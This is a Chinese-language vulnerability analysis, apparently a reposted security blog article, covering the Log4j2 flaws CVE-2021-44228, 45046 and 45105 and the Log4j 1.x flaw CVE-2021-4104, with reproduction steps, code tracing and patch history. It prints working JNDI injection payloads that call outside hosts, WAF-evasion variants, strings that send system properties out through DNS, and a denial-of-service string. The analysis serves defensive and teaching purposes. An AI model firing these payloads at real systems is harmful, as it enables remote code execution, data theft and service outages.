version="1.0" encoding="utf-8"?

# Log4j2系列漏洞分析汇总

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NzcxNjAyMQ==&mid=2247484703&idx=1&sn=a7b7a59b2ebf988ebce6d38160b11940&chksm=fc30c245cb474b53f98fbf3a982d60982cb1109112dd968a4d60b7dcd2f516cb5ce42bd8246b&scene=126&sessionid=1681400517#rd](http://mp.weixin.qq.com/s?__biz=MzU1NzcxNjAyMQ==&mid=2247484703&idx=1&sn=a7b7a59b2ebf988ebce6d38160b11940&chksm=fc30c245cb474b53f98fbf3a982d60982cb1109112dd968a4d60b7dcd2f516cb5ce42bd8246b&scene=126&sessionid=1681400517#rd)

一、**概述**

### **1.1 日志框架**

Web应用中，开发者通常通过打印日志快速定位问题，java里常见的log框架主要有：

1）java.util.logging：JDK中的Java原生日志框架

2）Log4j：基于 Java 的日志实用程序，使用广泛。

3）LogBack：Log4j的一个改良版本

4）Log4j 2：对Log4j的升级，比前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，是目前最优秀的Java日志框架。

  

### **1.2 Log4j2的使用**

 研究Log4j2的漏洞，首先必须清楚这个组件是怎么用的，这里以Springboot为例，实现登录/注册功能将用户输入的用户名打印到日志中：

1）新建项目Log4jDemo，定义/login接口，接收用户输入username，通过log4j2的logger.error方法打印：

![](../Images/cd21b3093b950b04ed8f9803b4d7d9e8.png)

 2）配置好maven包含log4j-core2.14.0依赖即可：

![](../Images/dcc192e9c1e2e1bd343565802824f5e0.png)

3）开启服务，访问POST接口，输入username=Jayway:

![](../Images/e5d9ce7d2397f6a5dbf0ca7a867c344d.png)

 4）工作台打印日志：

![](../Images/bf7fdb8b0bfdaccea3794dcdab8ff763.png)

  此外，log4j2还支持上下文查找的模式：

![](../Images/2e1098f4a14b8923db17a181d875a928.png)

这里在配置文件里使用ctx定义记录userid的值：

![](../Images/6d43be5c5ea250669d93fb05789ffb09.png)

定义一个接口（register），通过ThreadContext 映射userid来自输入值username：

![](../Images/5977710a6be94bedad474b15963b45da.png)

  这样我们访问register接口username=jayway123：  

![](../Images/269e72d2b54453a29c35ca5810c7a940.png)

就获取到我们输入值的日志：

![](../Images/88f791866b980003c5aa5af75a87aff0.png)

  

## 二、**CVE-2021-44228**  

### **2.1 漏洞信息**

² 漏洞类型：RCE

² 漏洞等级：Critical（CVSS：10.0）

² 影响版本：2.0-beta9到2.14.1

  

### **2.2 漏洞原理**

  日志在打印时当遇到“${”后，以“:”号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。

  

### **2.3 漏洞复现**

 1）漏洞探测

将输入替换为payload:${jndi:ldap://dnslog/a}:

![](../Images/e6d5ab8f0ea75cfb93c97349f3c06a4d.png)

DNSlog收到请求：

![](../Images/a9e6fbb455fd10402eabe42dfcdb7020.png)

 

2）漏洞利用

  上面这一步打通了，后面就是JNDI注入流程，和fastjson反序列化的gadget利用是一样的，这里不再赘述。

![](../Images/c02cbdbf33b94cae2dd4e1d7c67075dd.png)

 

### **2.4 漏洞分析**

  老样子，在漏洞触发点下断点，反推漏洞触发流程：这里根据官方patch在JndiManager.lookup处打断点，查看堆栈就很清楚logger.log到JNDI.look之间发生了什么：

![](../Images/0bf4534c3177c6b31615e90a652d8dc8.png)

 下面针对关键方法的处理逻辑进行分析：  

1）format()：MessagePatternConverter匹配日志中是否存在“${”,若是则进入append()：

![](../Images/bd71f0cd63faf37a3ae059e328bc70fd.png)

   

2）substitute()：通过prefix/suffixMatcher取出“${”与“}”之间的值，进入resolveVariable方法： 

![](../Images/105b90475080ae2d5145b73c5b0bab62.png)

  

3）resolveVariable：使用接口类lookup方法处理，这个方法有多个实现： 

![](../Images/27f28175ab5bfb0e700b39c4433007cf.png)

  

取prefix到strLookupMap中使用对应的lookup方法进行处理，Map里有java、ctx、upper、sys、jndi、env等可供解析，这里取到的是“jndi”：

![](../Images/1b058ae3f8fcb91b01635741b12722c4.png)

  

4）可见取到jndi的值：ldap://dnslog/a，直接进入到JNDI的lookup实现，即this.context.lookup(name)进行处理：  

![](../Images/cc3dbcb62731d75c09e808697299fc35.png)

 

### **2.5 WAF绕过&数据外带**

  此漏洞出现了一些变式，其实都可以用上节第三步解释，输入不同值交由不同的lookup实现类处理，如：

1）WAF绕过

把payload换为“j${lower:NDI}”，则进入lower对应的LowerLookup处理，处理后NDI变为ndi: 

![](../Images/419fcee33d56e42bf24dab0d2855c174.png)

可见这里是lookup逻辑就是调用原生toLowerCase()方法： 

![](../Images/099431225ec8bf97a27412e2f790de1e.png)

 然后再去匹配下一个“${”，再次递归处理，因此可以将payload做很多嵌套变式以躲避waf检测，如：  

${${lower:jndi}:${lower:rmi}://domain.com/j}

${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}

  但如果我们把payload稍微做一下变化：“j${lower:**\-**NDI}”，发现最终会解析为jNDI，只是多了个“\-”而已：

![](../Images/6347bdb899e1b83a3d58644321eb2982.png)

 原因是这里针对:-还有处理逻辑，只要匹配到就会解析为:-和}之间的值: 

![](../Images/f69ebe52c088cbf8a76258b1eb674c43.png)

如：j${xxxxxxx:-NDI}都会被处理为jNDI: 

![](../Images/3fcc63d0695406a32189faed03395d63.png)

  这就又出了一批绕过payload，如：  

j${::-nD}i${::-:} ——\>jnDi:

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j} ——\>jndi:rmi://domain.com/j

 

2）数据外带

  如果jndi被禁用了就无法进行RCE，但依然可以使用上面的其他解析逻辑，如：

${jndi:ldap://${sys:java.version}.domain/a}

${jndi:ldap://${hostName}.domain/a}

![](../Images/5e77572ff062fceca82e59dc49ae644a.png)

  

![](../Images/31564dc09108793d62c6f73f1aa23505.png)

![](../Images/40e2bd8c988a3545b192bf579d637434.png)  

  原理同样和上述一样，跟进发现sys处理对应的其实是System.getProperty()方法：

![](../Images/79135a263456539a0445ab08da24aab0.png)

  通过这种方式可将java版本等环境信息、application.properties 等配置文件外带。

  

### **2.6 2.15.0-rc1版本修复**

  临时版本2.15.0-rc1针对此RCE漏洞进行了修复，重新跑一遍流程，有如下两个变化：

1）toSerializable：默认关闭lookup功能

  对比2.4.1节，在修复后默认变成使用MessagePatternConverter.SimplePatternConverter的format方法处理，不再判断是否存在“${”：

![](../Images/d12b6cf1b06e3178726b44882837b801.png)

 可见直接将${字符拼接并打印： 

![](../Images/2a42113db06a3070baaba2e9b2e4f421.png)

默认情况下lookups的值为0，关闭lookup功能：

![](../Images/4d5d388b3b1ff49e982270340a68539d.png)

若手动配置开启，仍可走到Lookup分支，进行${}的处理： 

![](../Images/b4e3d25d7fe3efc0762daee857c164d4.png)

   

2）JndiManager.lookup：加入白名单限制

  这是第二个做修改的地方，在进入JNDI的lookup之前针对Protocol、Host及Class进行限制：

![](../Images/93da57afae74c2582b54dbff703c172b.png)

  白名单约定默认允许的协议是：java，ldap，ldaps，数据类型是八大基本数据类型，Host白名单是localhost：

![](../Images/a974a6b3f5a7081b31eb72ecde98ba0d.png)

  

### **2.7 2.15.0-****rc1修复绕过**

  2.15.0-rc1的修复逻辑看似很安全，但细节却没处理好：lookup中若触发了异常URISyntaxException，仍然会进入this.context.lookup，造成JNDI注入：

![](../Images/91e2b158aaf5459d66c5d17a710d5ec4.png)

  而触发这个异常也很简单，加个空格即可${jndi:ldap://127.0.0.1:1389/  abc}，lookup会自动去掉空格，依旧可以RCE。  

 

### **2.8 2.15.0-****rc****2版本****修复**

 rc2针对异常逻辑进行优化，加入一句warn后直接return，不再继续往下执行。至此CVE-2021-44228被成功修复。

![](../Images/e695f3250e5ec23a0774881137c0236e.png)

  一天后官方正式发布log4j-2.15.0，默认禁用lookup、加入白名单限制。  

  

## 三、**CVE-2021-45046**

### **3.1 漏洞信息**

² 漏洞类型：DoS/RCE

² 漏洞等级：Low（CVSS：3.7）——\>Critical（CVSS：9.0）

² 影响版本：2.0-beta9 到 2.15.0

  

### **3.2 漏洞原理**

当日志配置使用带有上下文查找的非默认模式布局（如$${ctx:loginId}）时，控制线程上下文映射 (MDC) 输入数据的攻击者可以使用 JNDI 查找模式制作恶意输入数据，导致Dos、部分环境信息泄露和远程代码执行。

这个漏洞本身是个Dos漏洞，但在12月17更新了一次，更新为RCE。

  

### **3.3 漏洞复现（DoS）**

 配置方法不同，一般有如下场景：

1）Log4j2.xml配置，开启lookup：

![](../Images/152e34bf04a23ea96fd36f64337c05fd.png)

拼接用户输入并打印：

![](../Images/7ce49496ae071ce2acce48d1b3c1c801.png)

  输入payload，每个payload将造成阻塞2s:  

username=${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}.....${jndi:ldap://127.0.0.1}

![](../Images/b28a38d3c964bfb0ac48b155179fa541.png)

2）Log4j2.xml还支持从上下文中取值，比如第一节中的$${ctx:loginId}），如下配置可以取到loginId值：

![](../Images/7601954aa10589109e5c7bfc0f9a70cf.png)

造成同样的阻塞效果：

![](../Images/ae349651ba5121399313c3782182899f.png)

  

### **3.4 漏洞分析（DoS）**

1）漏洞思路：

代码限制了JndiLookup只能取本地host。lookup本质是网络相关的操作，尝试去lookup本地但本地不可能开LDAP Server，于是便发生超时等待。

  

2）利用前提：

  漏洞利用前提是配置文件里开启lookup，或存在形如${ctx:loginId}的配置，这个配置可绕过默认的lookup限制：

![](../Images/2c614d9304054a765f808138e7547be2.png)

   

3）代码分析：

  在报错信息里很明显看到是connect操作导致的阻塞：

![](../Images/bbb22aa1fd9c84f73df1070603b33f39.png)

  至于后续的一次更新，原因在于有安全研究者发现可绕过host的限制，payload:

${jndi:ldap://127.0.0.1#evilhost.com:1389/a}

利用解析差异，java.net.URI的getHost() 方法返回 \# 之前的值作为真实主机，但 JNDI/LDAP 解析器将解析为后面的恶意 LDAP 服务器。（PS：次漏洞只在 MacOS 环境中方可触发）

  

### **3.5 漏洞修复**

  由于这个漏洞是jndi的lookup请求超时引起，官方发布临时版本2.15.1.rc1版本，默认禁用了jndi功能： 

![](../Images/0b40f10a17072303e5433d60cfb7ff47.png)

![](../Images/e8cb56ea261b421e680fe1a341a53b07.png)

 在正式的2.16.0干脆将lookup全部删除：

![](../Images/6b2e9c1ade9d2fbf5f5ab646cc53e14d.png)

## 四、**CVE-2021-45105**

### **4.1 漏洞信息**

² 漏洞类型：DoS

² 漏洞等级：High（CVSS：7.5）

² 影响版本： 2.0-beta9到2.16.0

  

### **4.2 漏洞原理**

  当日志配置使用带有上下文查找的非默认模式布局（例如，$${ctx:loginId}）时，控制线程上下文映射 (MDC) 输入数据的攻击者可以制作包含递归查找的恶意输入数据（如：${${::-${::-$${::-j}}}}），导致 StackOverflowError 将终止进程。

 

### **4.3 漏洞复现**

  这个漏洞其实算是45046的“附属品”，调试45046时就能发现这个DoS漏洞：输入payload：${::-${ctx:userid}} 

![](../Images/b639e7aabf7713dddc4ba169190ad1a1.png)

正常跟踪堆栈，发现到StrSubstitutor时候中存在checkCyclicSubstitution的判断，而这个判断会一直循环执行：

![](../Images/ea62678ce0faaffc0f53af94ed562709.png)

看下这个void判断方法的逻辑，if判断若不满足条件则直接退出方法，明显有问题：

![](../Images/30bf0f27e2806bcaffb75654255b9d25.png)

如此无限循环后，最终导致StackOverflowError：

![](../Images/7f6b599fbb639e03957f6fe58b43debb.png)

  

### **4.4 漏洞修复**

  2.17.0-rc1及正式2.17.0版本均做了修复，将此判断checkCyclicSubstitution改为bool方法，增加返回值return。

![](../Images/bbe0a8dc1795b9d170d7c7c862c93d7c.png)

  PS：由于这个漏洞发生在substitute解析阶段，还未走到lookup的逻辑，所以对于开启 log4j2.noFormatMsgLookup为true等情况下不能防御，只有升级至高版本。

  

  

## 五、**CVE-2021-4104**

最后提一下CVE-2021-4104，这个漏洞只影响log4j 1.x，和上面的Log4j2漏洞没有任何关系，且利用前提是配置文件能被控制，攻击者通过 JMSAppender 进行 JNDI 注入实现 RCE。

  也就是说，攻击者需要将Log4j.xml文件中配置Jms，指向恶意ldap服务器：

*<Jms name= **“**Jms**”*

*factoryBindingName=**”**ldap://evil.com/abc**”** destinationBindingName=**”**ldap://evil.com/abc**”**\>*

*</Jms>*

 后面JmsAppender将取factoryBindingName值，走到jndiManager.lookup并发起Jndi的lookup处理，这个触发点和44228一模一样，猜测是安全研究员根据44228漏洞特征反推到的利用链，只是外部输入并不可控，所以显得很鸡肋。

 

## **六、总结**

1）漏洞发展：

  一张图总结Log4j2系列漏洞的更新/绕过/修复：

![](../Images/c2350d8cce671c52bb357efffe564ae1.png)

  

2）漏洞总结

Log4j2系列漏洞，除了CVE-2021-44228，其他的几个漏洞都可以理解是在复现CVE-2021-44228的时候意外发现的漏洞，换句话说，真正有威胁的只有44228。

而对于CVE-2021-44228，大部分java应用一定是存在这个漏洞的，但存在漏洞≠可被利用，真正达成RCE的攻击效果需要满足各种条件，包括：目标机需要有公网权限（可出网）、JDK版本不能过高等。

 

3）修复建议

  当前2.17.0版本修复了出现的所有漏洞，暂未发现新的风险，建议升级至此版本。

 

 

 

参考：

https://logging.apache.org/log4j/2.x/security.html

https://github.com/apache/logging-log4j2/